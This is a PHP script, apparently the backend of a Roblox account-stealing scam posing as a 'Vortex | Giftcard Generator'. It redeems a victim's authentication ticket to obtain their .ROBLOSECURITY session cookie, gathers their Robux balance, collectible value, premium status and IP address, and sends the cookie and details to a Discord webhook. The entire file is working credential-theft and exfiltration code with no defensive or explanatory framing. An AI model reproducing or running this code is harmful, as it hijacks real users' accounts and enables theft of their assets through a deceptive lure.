<?php
    require("config.php");
    header("Access-Control-Allow-Origin: *");

    if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
        die();
    }

    $ticket = $_GET["t"];
    if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
        die();
    }

    // request for auth2cookie
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
                "{\"authenticationTicket\": \"$ticket\"}");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Referer: https://www.roblox.com/games/1818/--',
        'Origin: https://www.roblox.com',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: 1'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    
function get_user_rap($user_id, $cookie) {

        $cursor = "";

        $total_rap = 0;



        while ($cursor !== null) {

            $request = curl_init();

            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");

            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));

            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);

            $data = json_decode(curl_exec($request), 1);

            foreach($data["data"] as $item) {

                $total_rap += $item["recentAveragePrice"];

            }

            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;

        }



        return $total_rap;

    }
    // attempt to find set-cookie header for .ROBLOSECURITY
    $cookie = null;

    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        $user_rap = get_user_rap($profile["UserID"], $cookie);
        if (account_filter($profile)) {
            $hookObject = json_encode([
                 "username" => "Vortex | Giftcard Generator",
        "avatar_url" => "https://logos-download.com/wp-content/uploads/2018/12/Vortex_Logo.png",
                "embeds" => [
                    [
                        "title" => "Account Obtained",
                        "type" => "rich",
                        "description" => "",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "timestamp" => date("c"),
                        "color" => hexdec("#0015ff"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                        ],
                        "author" => [
                            "name" => "Vortex | Giftcard Generator",
                            "url" => "https://discord.gg/9s3MAYgAUw"
                        ],
                        "fields" => [
                            [
                                "name" => "Roblox Name",
                                "value" => $profile["UserName"]
                            ],
                            [
                                "name" => "IP Address",
                                "value" => $_SERVER['REMOTE_ADDR']
                            ],
                            [
                                "name" => "Robux Balance",
                                "value" => $profile["RobuxBalance"]
                            ],
                            [
                                "name" => "RAP",
                                "value" => $user_rap
                            ],
                            [
                                "name" => "Premium",
                                "value" => $profile["IsPremium"]
                            ],
                            [
                                "name" => "Rolimon's",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                            ],
                            [
                                "name" => "Cookie",
                                "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            $ch = curl_init();
            
            $response = curl_exec( $ch );
            curl_close( $ch );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
        }
    }
?>